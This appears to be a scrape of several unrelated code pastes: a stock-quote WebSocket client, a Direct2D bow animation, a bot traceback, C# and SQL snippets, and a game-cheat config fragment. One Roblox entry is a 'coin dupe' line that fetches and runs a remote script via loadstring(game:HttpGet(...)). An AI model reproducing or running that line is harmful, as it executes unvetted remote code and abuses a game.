07404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF006"",""9.yaw_jitter_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF009"",""quick_plant"":true,""11.yaw_jitter_variance"":0,""11.defensive_yaw_offset"":180,""freestanding"":true,""12.override"":true,""3.yaw_jitter_variance"":0,""13.defensive_angles"":false,""1.yaw_jitter_variance"":0,""roll_offset"":0,""3.yaw_left"":-7,""10.defensive_pitch_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0010"",""13.pitch_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0013"",""13.yaw_base"":""Local view"",""8.defensive_yaw_jitter1"":false,""6.force_defensive"":false,""10.defensive_yaw_jitter_left"":0,""8.force_defensive"":false,""6.body_yaw_offset"":0,""13.pitch"":""Off"",""1.override"":true,""13.defensive_yaw_jitter_right"":0,""13.yaw"":""Off"",""7.defensive_yaw_delay"":1,""4.yaw_offset"":0,""9.defensive_pitch_delay"":1,""5.defensive_pitch"":false,""better_scope_overlay_inverted"":false,""force_second_zoom"":false,""12.defensive_yaw_jitter1"":false,""13.defensive_yaw_variance"":0,""13.yaw_variance"":0,""9.yaw_jitter"":""Off"",""13.body_yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0013"",""8.bombsite_fix"":false,""2.force_defensive"":true,""10.separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0010"",""4.force_defensive"":true,""4.bombsite_fix"":false,""12.defensive_pitch_offset2"":0,""6.defensive_yaw"":false}"
zpqrf5GE,Alpaca Price Watch,About80Ninjas,Python,Friday 30th of May 2025 11:22:07 AM CDT,"import websocket
import json
import os
import time
from datetime import datetime, timezone

# --- ANSI Color Codes ---
GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m' # Resets the color
YELLOW = '\033[93m' # For no change or initial display
BLUE = '\033[94m'   # For TRADE label
CYAN = '\033[96m'   # For QUOTE label

# --- TROUBLESHOOTING NOTE ---
# ""insufficient subscription (Code: 409)"" from Alpaca means your API key
# doesn't have the necessary subscription for the chosen data feed.
# Ensure SOCKET_URL below is set appropriately (likely IEX_SOCKET_URL for paper trading).
# --- END TROUBLESHOOTING NOTE ---

# --- Configuration ---
API_KEY = os.environ.get('APCA_API_KEY_ID') or ""YOUR_API_KEY""
API_SECRET = os.environ.get('APCA_API_SECRET_KEY') or ""YOUR_API_SECRET""
TICKER_SYMBOL = ""GME""

SIP_SOCKET_URL = ""wss://stream.data.alpaca.markets/v2/sip""
IEX_SOCKET_URL = ""wss://stream.data.alpaca.markets/v2/iex""

# CHOOSE YOUR SOCKET URL HERE:
# For paper trading, use IEX_SOCKET_URL.
# SOCKET_URL = SIP_SOCKET_URL
SOCKET_URL = IEX_SOCKET_URL # Set for IEX based on paper account

# --- Global Variables ---
authenticated = False
# Store the last prices to determine color changes
last_trade_price = 0.0
last_bid_price = 0.0
last_ask_price = 0.0


def get_price_color(current_price, last_price):
    """"""Determines the color based on price change.""""""
    if last_price == 0.0: # First price update
        return YELLOW
    if current_price is None: # current_price might be None if parsing failed
        return RESET # Default color if price is None
    if current_price > last_price:
        return GREEN
    elif current_price < last_price:
        return RED
    else:
        return YELLOW

def format_timestamp_iso(iso_timestamp_str):
    """"""Formats an ISO 8601 timestamp string (used for both trades and quotes from IEX).""""""
    if iso_timestamp_str:
        try:
            if iso_timestamp_str.endswith('Z'):
                 dt_object = datetime.fromisoformat(iso_timestamp_str.replace('Z', '+00:00'))
            else:
                 dt_object = datetime.fromisoformat(iso_timestamp_str)
                 if dt_object.tzinfo is None:
                      dt_object = dt_object.replace(tzinfo=timezone.utc)
            return dt_object.strftime('%H:%M:%S.%f')[:-3] + "" UTC""
        except ValueError as e:
            print(f""{RED}Error converting ISO timestamp '{iso_timestamp_str}': {e}{RESET}"")
            return ""Invalid Timestamp""
    return ""N/A""


def on_open(ws):
    global authenticated, last_trade_price, last_bid_price, last_ask_price
    authenticated = False
    last_trade_price = 0.0
    last_bid_price = 0.0
    last_ask_price = 0.0
    print(""WebSocket connection opened."")
    if not API_KEY or API_KEY == ""YOUR_API_KEY"" or not API_SECRET or API_SECRET == ""YOUR_API_SECRET"":
        print(f""{RED}Error: API_KEY or API_SECRET not configured. Please set them.{RESET}"")
        ws.close()
        return

    auth_data = {""action"": ""auth"", ""key"": API_KEY, ""secret"": API_SECRET}
    ws.send(json.dumps(auth_data))
    print(f""Sent authentication request for API Key ID starting with: {API_KEY[:4]}..."")

def on_message(ws, message):
    global authenticated, last_trade_price, last_bid_price, last_ask_price
    try:
        data_list = json.loads(message)
        for item in data_list:
            message_type = item.get(""T"")

            if message_type == ""success"" and item.get(""msg"") == ""authenticated"":
                authenticated = True
                print(f""{GREEN}Successfully authenticated!{RESET}"")
                subscribe_message = {
                    ""action"": ""subscribe"",
                    ""trades"": [TICKER_SYMBOL],
                    ""quotes"": [TICKER_SYMBOL],
                }
                ws.send(json.dumps(subscribe_message))
                print(f""Subscribing to trades and quotes for {TICKER_SYMBOL}..."")

            elif message_type == ""error"":
                error_msg = item.get('msg')
                error_code = item.get('code')
                print(f""{RED}API Error: {error_msg} (Code: {error_code}){RESET}"")
                if error_code == 409:
                    print(f""{RED}This 'insufficient subscription' error means your Alpaca account/API key ""
                          f""doesn't have access to this data feed. Check SOCKET_URL and your Alpaca plan.{RESET}"")
                ws.close()

            elif message_type == ""subscription"":
                print(f""Subscription update: Trades: {item.get('trades', [])}, ""
                      f""Quotes: {item.get('quotes', [])}, Bars: {item.get('bars', [])}"")

            elif authenticated:
                symbol = item.get(""S"")
                if symbol != TICKER_SYMBOL:
                    continue

                if message_type == ""t"":  # Trade message
                    price = item.get(""p"")
                    size = item.get(""s"")
                    raw_timestamp = item.get(""t"")
                    readable_time = format_timestamp_iso(raw_timestamp)
                    
                    price_color = get_price_color(price, last_trade_price)
                    price_num = price if price is not None else 0.0

                    # Infer trade side
                    trade_side_indicator = f""{YELLOW}[CROSS]{RESET}"" # Default
                    if price is not None:
                        if last_ask_price > 0 and price >= last_ask_price:
                            trade_side_indicator = f""{GREEN}[BUY]{RESET}""
                        elif last_bid_price > 0 and price <= last_bid_price:
                            trade_side_indicator = f""{RED}[SELL]{RESET}""
                    
                    print(f""{BLUE}TRADE{RESET} [{symbol}]: {trade_side_indicator} Price: {price_color}${price_num:<7.2f}{RESET} ""
                          f""Size: {size:<5} Time: {readable_time}"")
                    
                    if price is not None:
                        last_trade_price = price


                elif message_type == ""q"":  # Quote message
                    bid_price = item.get(""bp"")
                    bid_size = item.get(""bs"")
                    ask_price = item.get(""ap"")
                    ask_size = item.get(""as"")
                    raw_timestamp = item.get(""t"")
                    readable_time = format_timestamp_iso(raw_timestamp)

                    bid_color = get_price_color(bid_price, last_bid_price)
                    ask_color = get_price_color(ask_price, last_ask_price)

                    bid_price_num = bid_price if bid_price is not None else 0.0
                    ask_price_num = ask_price if ask_price is not None else 0.0
                    
                    print(f""{CYAN}QUOTE{RESET} [{symbol}]: Bid: {bid_color}${bid_price_num:<7.2f}{RESET} (Size: {bid_size:<4}) ""
                          f""Ask: {ask_color}${ask_price_num:<7.2f}{RESET} (Size: {ask_size:<4}) Time: {readable_time}"")
                    
                    if bid_price is not None:
                        last_bid_price = bid_price
                    if ask_price is not None:
                        last_ask_price = ask_price
                
                elif not (message_type == ""success"" and item.get(""msg"") == ""connected""):
                    print(f""Other data: {item}"")
            
            elif not (message_type == ""success"" and item.get(""msg"") == ""connected""):
                 print(f""System message: {item}"")

    except json.JSONDecodeError:
        print(f""{RED}Failed to decode JSON: {message}{RESET}"")
    except Exception as e:
        print(f""{RED}An error occurred in on_message: {e!r}{RESET}"")

def on_error(ws, error):
    print(f""{RED}WebSocket error: {error}{RESET}"")

def on_close(ws, close_status_code, close_msg):
    global authenticated
    authenticated = False
    print(f""WebSocket connection closed. Code: {close_status_code}, Message: {close_msg if close_msg else 'N/A'}"")

def main():
    print(""Starting Alpaca WebSocket client..."")
    print(f""Connecting to: {SOCKET_URL} for ticker: {TICKER_SYMBOL}"")

    if API_KEY == ""YOUR_API_KEY"" or API_SECRET == ""YOUR_API_SECRET"":
        print(f""{YELLOW}WARNING: API_KEY or API_SECRET is set to placeholder values. Please configure them.{RESET}"")

    ws_app = websocket.WebSocketApp(SOCKET_URL,
                                  on_open=on_open,
                                  on_message=on_message,
                                  on_error=on_error,
                                  on_close=on_close)
    try:
        ws_app.run_forever()
    except KeyboardInterrupt:
        print(f""\n{YELLOW}WebSocket client stopped by user.{RESET}"")
    except Exception as e:
        print(f""{RED}An unexpected error occurred while running WebSocketApp: {e!r}{RESET}"")
    finally:
        if 'ws_app' in locals() and hasattr(ws_app, 'sock') and ws_app.sock and ws_app.sock.connected:
            ws_app.close()
        print(""WebSocket client shutdown complete."")

if __name__ == ""__main__"":
    main()
"
SqzSEmtz,LongBow & Arrow Animation Wireframe (Improved Trajectory),alien_fx_fiend,C++,Friday 30th of May 2025 11:03:38 AM CDT,"==++ Here is the full source code (file 1/1) of ""bow and arrow.cpp"":: ++==
```bow and arrow.cpp
//  BowAndArrow.cpp
//  Simple Win32 / Direct2D demo - ""wireframe longbow""
//  Build: cl /EHsc /DUNICODE /D_UNICODE BowAndArrow.cpp d2d1.lib user32.lib gdi32.lib

#include <windows.h>
#include <d2d1.h>
#include <chrono>
#include <cmath>
#include <algorithm>
#pragma comment(lib, ""d2d1"")

// -------------------------------------------------
// Small RAII helper to release COM objects
// -------------------------------------------------
template<class T> void SafeRelease(T** pp)
{
    if (*pp) { (*pp)->Release(); *pp = nullptr; }
}

// -------------------------------------------------
// Animation constants
// -------------------------------------------------
constexpr float  COCK_TIME = 1.0f;   // seconds
constexpr float  HOLD_TIME = 0.5f;   // seconds
constexpr float  FIRE_TIME = 1.0f;   // seconds
constexpr UINT   TIMER_ID = 1;
constexpr UINT   TIMER_MS = 16;     // ~60 FPS

enum class AnimStage { Cocking, Hold, Firing, Done };
constexpr float ARROW_REST_OFFSET = 500.0f;   // pixels in-front of bow ( > 0 )

// String pull distance (pixels) and bow X center
constexpr float STRING_MAX_PULL = 180.0f;
constexpr float CX_BOW = 220.0f;

// -------------------------------------------------
// Global state (kept simple for a demo)
// -------------------------------------------------
HWND                    g_hWnd = nullptr;
ID2D1Factory* g_pFactory = nullptr;
ID2D1HwndRenderTarget* g_pRenderTarget = nullptr;
ID2D1SolidColorBrush* g_pBrush = nullptr;

float g_windowW = 1280.0f;
float g_windowH = 720.0f;
// Modify g_arrowPosX initialization to start off-screen at the top
float g_arrowPosX = CX_BOW;   // Will be properly positioned in animation update
// Add these with other global variables
float g_arrowPosY = 0.0f;       // Variable for arrow's vertical position
float g_arrowRotation = 0.0f;   // Rotation angle in radians

// Geometry helpers (depend on window height, so they are updated in WM_SIZE)
float cx = CX_BOW;
float topY = 120.0f;
float bottomY = 600.0f;   // will be overwritten in WM_SIZE
float midY = 360.0f;
float halfHeight = 240.0f;

// Animation variables
AnimStage   g_stage = AnimStage::Cocking;
float       g_timeInStage = 0.0f;        // seconds
auto        g_prevTick = std::chrono::high_resolution_clock::now();
float       g_stringOffset = 0.0f;        // 0 = relaxed, 1 = fully drawn
//float       g_arrowPosX = 0.0f;        // head position

// -------------------------------------------------
// Helpers
// -------------------------------------------------
float Lerp(float a, float b, float t) { return a + (b - a) * t; }

// Create or re-create render target
HRESULT CreateDeviceResources()
{
    if (g_pRenderTarget) return S_OK;

    RECT rc; GetClientRect(g_hWnd, &rc);

    D2D1_SIZE_U size = D2D1::SizeU(rc.right - rc.left,
        rc.bottom - rc.top);

    HRESULT hr = g_pFactory->CreateHwndRenderTarget(
        D2D1::RenderTargetProperties(),
        D2D1::HwndRenderTargetProperties(g_hWnd, size),
        &g_pRenderTarget);

    if (SUCCEEDED(hr))
        hr = g_pRenderTarget->CreateSolidColorBrush(
            D2D1::ColorF(D2D1::ColorF::White), &g_pBrush);

    return hr;
}

void DiscardDeviceResources()
{
    SafeRelease(&g_pBrush);
    SafeRelease(&g_pRenderTarget);
}

// -------------------------------------------------
// Core rendering
// -------------------------------------------------
void OnRender()
{
    if (FAILED(CreateDeviceResources()))
        return;

    g_pRenderTarget->BeginDraw();
    g_pRenderTarget->Clear(D2D1::ColorF(0x202020)); // dark bg

    // -------------------------------------------------
    // 1. Draw Bow limbs (two quadratic curves)
    // -------------------------------------------------
    ID2D1PathGeometry* pGeom = nullptr;
    ID2D1GeometrySink* pSink = nullptr;
    if (SUCCEEDED(g_pFactory->CreatePathGeometry(&pGeom)))
    {
        pGeom->Open(&pSink);

        //--------------------------------------------------------------
        //  One continuous "")""-shaped limb with a slightly pointy tip.
        //  End-points stay on the string ( (cx, topY) & (cx, bottomY) )
        //--------------------------------------------------------------
        constexpr float NOSE = 35.0f;               // how far the tips stick out
        const     float BULGE = halfHeight * 0.5f;  // max belly distance (x)

        pSink->BeginFigure(D2D1::Point2F(cx, topY), D2D1_FIGURE_BEGIN_HOLLOW);

        // Draw semicircle bow with pointy tip at middle
        // First quarter - top to middle-top
        pSink->AddBezier(
            D2D1::BezierSegment(
                D2D1::Point2F(cx + NOSE, topY + halfHeight * 0.1f),      // slight curve at top
                D2D1::Point2F(cx + BULGE, topY + halfHeight * 0.5f),     // first quarter curve
                D2D1::Point2F(cx + BULGE + NOSE, midY - NOSE)));         // approaching tip

        // Middle part with pointy tip
        pSink->AddBezier(
            D2D1::BezierSegment(
                D2D1::Point2F(cx + BULGE + NOSE * 1.2f, midY - NOSE * 0.5f),  // curve to tip
                D2D1::Point2F(cx + BULGE + NOSE * 1.5f, midY),               // pointy tip
                D2D1::Point2F(cx + BULGE + NOSE * 1.2f, midY + NOSE * 0.5f)));  // curve from tip

        // Last quarter - middle-bottom to bottom
        pSink->AddBezier(
            D2D1::BezierSegment(
                D2D1::Point2F(cx + BULGE + NOSE, midY + NOSE),            // after tip
                D2D1::Point2F(cx + BULGE, bottomY - halfHeight * 0.5f),   // last quarter curve
                D2D1::Point2F(cx + NOSE, bottomY - halfHeight * 0.1f)));  // approaching bottom

        // Connect back to string
        pSink->AddBezier(
            D2D1::BezierSegment(
                D2D1::Point2F(cx + NOSE * 0.5f, bottomY - NOSE * 0.25f),  // curve to bottom
                D2D1::Point2F(cx, bottomY),                              // bottom endpoint
                D2D1::Point2F(cx, bottomY)));                            // dummy point (required)

        pSink->EndFigure(D2D1_FIGURE_END_OPEN);

        pSink->Close();
        g_pRenderTarget->DrawGeometry(pGeom, g_pBrush, 2.0f);

        SafeRelease(&pSink);
        SafeRelease(&pGeom);
    }

    // -------------------------------------------------
    // 2. Draw Bow string
    // -------------------------------------------------
    float pull = g_stringOffset * STRING_MAX_PULL;
    D2D1_POINT_2F p1 = D2D1::Point2F(cx, topY);
    D2D1_POINT_2F pm = D2D1::Point2F(cx - pull, midY);
    D2D1_POINT_2F p2 = D2D1::Point2F(cx, bottomY);

    g_pRenderTarget->DrawLine(p1, pm, g_pBrush, 2.0f);
    g_pRenderTarget->DrawLine(pm, p2, g_pBrush, 2.0f);

    // Replace the OnRender arrow drawing section with this to use variable Y position
// Replace the OnRender arrow drawing section with this to use variable Y position and rotation
// Replace the OnRender arrow drawing section with this to use variable Y position and rotation
// -------------------------------------------------
// 3. Draw Arrow (simple shaft + head + tail)
// -------------------------------------------------
    float arrowLen = 240.0f;
    float arrowHead = 18.0f;

    // Apply rotation to the arrow
    g_pRenderTarget->SetTransform(
        D2D1::Matrix3x2F::Rotation(
            g_arrowRotation * (180.0f / 3.14159f), // Convert radians to degrees
            D2D1::Point2F(g_arrowPosX, g_arrowPosY)
        )
    );

    // Shaft
    g_pRenderTarget->DrawLine(
        D2D1::Point2F(g_arrowPosX, g_arrowPosY),
        D2D1::Point2F(g_arrowPosX - arrowLen, g_arrowPosY),
        g_pBrush, 2.0f);

    // Arrow head (small triangle)
    D2D1_POINT_2F headPts[3] = {
        D2D1::Point2F(g_arrowPosX,                 g_arrowPosY),
        D2D1::Point2F(g_arrowPosX - arrowHead,     g_arrowPosY - arrowHead * 0.5f),
        D2D1::Point2F(g_arrowPosX - arrowHead,     g_arrowPosY + arrowHead * 0.5f)
    };
    g_pRenderTarget->DrawLine(headPts[0], headPts[1], g_pBrush, 2.0f);
    g_pRenderTarget->DrawLine(headPts[0], headPts[2], g_pBrush, 2.0f);

    // Fletching (3 short diagonal lines)
    const float fletch = 20.0f;
    const float step = 5.0f;
    // Top fletching
    for (int i = 0; i < 6; ++i)
    {
        float x = g_arrowPosX - arrowLen + i * step;
        g_pRenderTarget->DrawLine(
            D2D1::Point2F(x, g_arrowPosY),
            D2D1::Point2F(x - fletch, g_arrowPosY - fletch * 0.4f + i * 3.0f),
            g_pBrush, 2.0f);
    }
    // Bottom fletching
    for (int i = 0; i < 6; ++i)
    {
        float x = g_arrowPosX - arrowLen + i * step;
        g_pRenderTarget->DrawLine(
            D2D1::Point2F(x, g_arrowPosY),
            D2D1::Point2F(x - fletch, g_arrowPosY + fletch * 0.4f - i * 3.0f),
            g_pBrush, 2.0f);
    }

    // Reset transform for other drawing operations
    g_pRenderTarget->SetTransform(D2D1::Matrix3x2F::Identity());

    // Present
    HRESULT hr = g_pRenderTarget->EndDraw();
    if (hr == D2DERR_RECREATE_TARGET)
        DiscardDeviceResources();
}

// -------------------------------------------------
// Animation tick (called from WM_TIMER)
// -------------------------------------------------
// Replace the UpdateAnimation function with this updated version
// Replace the UpdateAnimation function with this updated version
void UpdateAnimation()
{
    // Compute delta time
    auto  now = std::chrono::high_resolution_clock::now();
    float dt = std::chrono::duration<float>(now - g_prevTick).count();
    g_prevTick = now;
    g_timeInStage += dt;

    switch (g_stage)
    {
    case AnimStage::Cocking:
    {
        float t = min(g_timeInStage / COCK_TIME, 1.0f);

        if (t < 0.6f) {
            // First part: arrow dropping from top with tail pointing down
            float arcT = t / 0.6f;  // Normalize to 0-1 for just this part

            // Starting position at top, end at bow position
            float startX = cx + 100.0f;    // Start slightly right of bow
            float startY = 0.0f;           // Start at top of screen
            float endX = cx + 50.0f;       // End to the right of bow
            float endY = midY - 50.0f;     // End slightly above midpoint

            // Calculate curved path 
            g_arrowPosX = Lerp(startX, endX, arcT);
            g_arrowPosY = Lerp(startY, endY, arcT * arcT); // Accelerate down

            // Arrow has tail pointing down (pointing up = -90 degrees = -PI/2)
            g_arrowRotation = -1.57079f + arcT * 1.07079f; // -PI/2 to close to 0
        }
        else if (t < 0.8f) {
            // Second part: arrow rotates to horizontal and moves into position
            float alignT = (t - 0.6f) / 0.2f;  // Normalize to 0-1 for just this part

            // Move arrow into position horizontally
            float startX = cx + 50.0f;
            float startY = midY - 50.0f;
            float endX = cx + 50.0f;  // Position just right of the bow
            float endY = midY;        // At the midpoint height

            g_arrowPosX = Lerp(startX, endX, alignT);
            g_arrowPosY = Lerp(startY, endY, alignT);

            // Complete the rotation to horizontal
            g_arrowRotation = Lerp(-0.5f, 0.0f, alignT); // Finish rotating to horizontal
        }
        else {
            // Third part: arrow attaches to string and string gets pulled
            float stringT = (t - 0.8f) / 0.2f;  // Normalize to 0-1 for just this part

            // Move arrow with string as it's drawn back
            float startX = cx + 50.0f;
            float endX = cx - STRING_MAX_PULL + 50.0f;

            g_arrowPosX = Lerp(startX, endX, stringT);
            g_arrowPosY = midY;
            g_arrowRotation = 0.0f;  // Keep horizontal

            // Pull string back gradually
            g_stringOffset = stringT;
        }

        if (t >= 1.0f) { g_stage = AnimStage::Hold; g_timeInStage = 0.f; }
    } break;

    case AnimStage::Hold:
        // Arrow is now at the correct position
        g_arrowPosY = midY;
        g_arrowRotation = 0.0f;  // Ensure arrow is horizontal

        if (g_timeInStage >= HOLD_TIME)
        {
            g_stage = AnimStage::Firing; g_timeInStage = 0.f;
        }
        break;

    case AnimStage::Firing:
    {
        float t = min(g_timeInStage / FIRE_TIME, 1.0f);
        g_stringOffset = 1.0f - t;             // 1 -> 0  (same)

        float startX = cx - STRING_MAX_PULL + 50.0f;
        float endX = g_windowW + 100.0f;
        g_arrowPosX = Lerp(startX, endX, t);
        g_arrowPosY = midY; // Keep arrow on straight horizontal path
        g_arrowRotation = 0.0f;  // Keep arrow horizontal

        if (t >= 1.0f)
        {
            g_stage = AnimStage::Cocking; g_timeInStage = 0.f;
            // Reset arrow to starting position for next animation cycle
            g_arrowPosX = cx + 100.0f;
            g_arrowPosY = 0.0f;
            g_arrowRotation = -1.57079f;  // Start with tail pointing down (arrow pointing up)
        }
    } break;

    case AnimStage::Done:
        // Not used anymore, but kept for completeness
        break;
    }

    // Request redraw
    InvalidateRect(g_hWnd, nullptr, FALSE);
}

// -------------------------------------------------
// Window procedure
// -------------------------------------------------
LRESULT CALLBACK WndProc(HWND hWnd, UINT msg,
    WPARAM wParam, LPARAM lParam)
{
    switch (msg)
    {
        // Add this initialization in WM_CREATE or before animation starts
    // Add to WM_CREATE case or main initialization
    // Add this initialization in WM_CREATE case
    case WM_CREATE:
        if (FAILED(D2D1CreateFactory(D2D1_FACTORY_TYPE_SINGLE_THREADED,
            &g_pFactory)))
            return -1; // abort window creation
        SetTimer(hWnd, TIMER_ID, TIMER_MS, nullptr);
        g_prevTick = std::chrono::high_resolution_clock::now();
        g_arrowPosX = cx + 100.0f;   // Initialize right of bow
        g_arrowPosY = 0.0f;          // Initialize at top of screen
        g_arrowRotation = -1.57079f; // Start with tail pointing down (arrow pointing up)
        return 0;

    case WM_SIZE:
    {
        g_windowW = static_cast<float>(LOWORD(lParam));
        g_windowH = static_cast<float>(HIWORD(lParam));

        // Update dependent geometry values
        topY = 120.0f;
        bottomY = g_windowH - 120.0f;
        midY = (topY + bottomY) * 0.5f;
        halfHeight = (bottomY - topY) * 0.5f;

        if (g_pRenderTarget)
            g_pRenderTarget->Resize(
                D2D1::SizeU(static_cast<UINT>(g_windowW),
                    static_cast<UINT>(g_windowH)));
    }
    return 0;

    case WM_TIMER:
        if (wParam == TIMER_ID)
            UpdateAnimation();
        return 0;

    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        BeginPaint(hWnd, &ps);
        OnRender();
        EndPaint(hWnd, &ps);
    } return 0;

    case WM_DESTROY:
        KillTimer(hWnd, TIMER_ID);
        DiscardDeviceResources();
        SafeRelease(&g_pFactory);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hWnd, msg, wParam, lParam);
}

// -------------------------------------------------
// WinMain - entry point
// -------------------------------------------------
int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int nCmdShow)
{
    const wchar_t CLASS_NAME[] = L""BowWindow"";

    WNDCLASS wc = {};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInst;
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wc.lpszClassName = CLASS_NAME;
    RegisterClass(&wc);

    g_hWnd = CreateWindowEx(0, CLASS_NAME, L""Direct2D - Longbow Demo"",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT,
        static_cast<int>(g_windowW),
        static_cast<int>(g_windowH),
        nullptr, nullptr, hInst, nullptr);

    ShowWindow(g_hWnd, nCmdShow);

    // Main message loop
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
```"
xDtWUxKm,ServerError: received 500 HTTP response,basedcount_bot,Python,Friday 30th of May 2025 11:01:39 AM CDT,"Traceback (most recent call last):
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 46, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 123, in check_mail
    async for message in reddit_instance.inbox.unread(limit=None):  # Message
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/listing/generator.py"", line 37, in __anext__
    await self._next_batch()
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/listing/generator.py"", line 90, in _next_batch
    self._listing = await self._reddit.get(self.url, params=self.params)
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 54, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 813, in get
    return await self._objectify_request(method=""GET"", params=params, path=path)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 570, in _objectify_request
    await self.request(
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 54, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 1061, in request
    return await self._core.request(
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 383, in request
    return await self._request_with_retries(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 305, in _request_with_retries
    return await self._do_retry(
           ^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 170, in _do_retry
    return await self._request_with_retries(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 305, in _request_with_retries
    return await self._do_retry(
           ^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 170, in _do_retry
    return await self._request_with_retries(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 322, in _request_with_retries
    raise self.STATUS_EXCEPTIONS[response.status](response)
asyncprawcore.exceptions.ServerError: received 500 HTTP response
"
4bK9ETGF,Untitled,gandalfbialy,C#,Friday 30th of May 2025 10:58:26 AM CDT,"using KinoGigant;

// Class responsible for storing and managing cinema showtimes.
public class ShowCatalog
{
    // Private list of all showtimes.
    private readonly List<Show> _shows = new();

    // Exposes the showtimes as a read-only collection.
    public IReadOnlyList<Show> Shows => _shows;

    // Adds sample showtimes to the catalog.
    public void SeedSampleShows()
    {
        // Add the ""Matrix"" showtime.
        Add(new Show(
            title: ""Matrix"",
            dateTime: new DateTime(2025, 4, 10),
            hour: new DateTime(2025, 4, 10, 18, 0, 0),
            numberOfSeats: 30));

        // Add the ""Inception"" showtime.
        Add(new Show(
            title: ""Inception"",
            dateTime: new DateTime(2025, 4, 11),
            hour: new DateTime(2025, 4, 11, 20, 0, 0),
            numberOfSeats: 30));
    }

    // Adds a single show to the catalog.
    public void Add(Show show) => _shows.Add(show);
}
"
6i66XGVb,Grow A Garden Coin Dupe NOT PATCHED,velvetkk,Lua,Friday 30th of May 2025 10:52:30 AM CDT,"loadstring(game:HttpGet(""https://raw.githubusercontent.com/castleofsolace/GrowAGardenDUPE1/refs/heads/main/mainHub""))()

-- GROW A GARDEN COIN DUPE
-- USE IT WHILE II'S NOT PATCHED"
zvSnYJ6s,Untitled,chrissharp123,PostgreSQL,Friday 30th of May 2025 10:36:51 AM CDT,"delete from 	actor.usr_message aum
where not exists (
	select 1
	from actor.usr_standing_penalty ausp
	where ausp.usr_message = aum.id
	) and aum.create_date < date(now() - '3 months'::interval);
"
wCHt40t3,Mario-SideScroller D2D-Platformer-Demo,alien_fx_fiend,C++,Friday 30th of May 2025 10:17:15 AM CDT,"++== Here's the full source code for (file 1/1) of ""D2d-Platform-Demo.cpp""::: ++==
```D2d-Platform-Demo.cpp
// ------------------------------------------------------------------
